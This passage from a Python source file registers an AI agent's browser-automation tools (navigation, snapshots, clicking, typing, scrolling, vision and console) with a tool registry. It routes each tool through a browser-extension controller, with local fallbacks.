        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
from tools.registry import registry, tool_error
from tools.browser_extension_router import (
    extension_controller_available,
    routed_browser_handler,
)

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}


def _browser_router_kw(kw: dict) -> dict:
    """Identity kwargs forwarded to the extension router wrapper."""
    return {
        "task_id": kw.get("task_id"),
        "session_id": kw.get("session_id"),
    }


def check_browser_routed_requirements(action: str = "browser_snapshot") -> bool:
    """Availability gate for tools that can use either browser backend."""
    return check_browser_requirements() or extension_controller_available(action)


def check_browser_navigate_requirements() -> bool:
    return check_browser_routed_requirements("browser_navigate")


def check_browser_snapshot_requirements() -> bool:
    return check_browser_routed_requirements("browser_snapshot")


def check_browser_click_requirements() -> bool:
    return check_browser_routed_requirements("browser_click")


def check_browser_type_requirements() -> bool:
    return check_browser_routed_requirements("browser_type")


def check_browser_scroll_requirements() -> bool:
    return check_browser_routed_requirements("browser_scroll")


def check_browser_back_requirements() -> bool:
    return check_browser_routed_requirements("browser_back")


def check_browser_press_requirements() -> bool:
    return check_browser_routed_requirements("browser_press")


registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_navigate",
        args,
        fallback=lambda: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_navigate_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_snapshot",
        args,
        fallback=lambda: browser_snapshot(
            full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_snapshot_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_click",
        args,
        fallback=lambda: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_click_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_type",
        args,
        fallback=lambda: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_type_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_scroll",
        args,
        fallback=lambda: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_scroll_requirements,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_back",
        args,
        fallback=lambda: browser_back(task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_back_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_press",
        args,
        fallback=lambda: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_press_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_get_images",
        args,
        fallback=lambda: browser_get_images(task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_vision",
        args,
        fallback=lambda: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_vision_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: routed_browser_handler(
        "browser_console",
        args,
        fallback=lambda: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
        **_browser_router_kw(kw),
    ),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
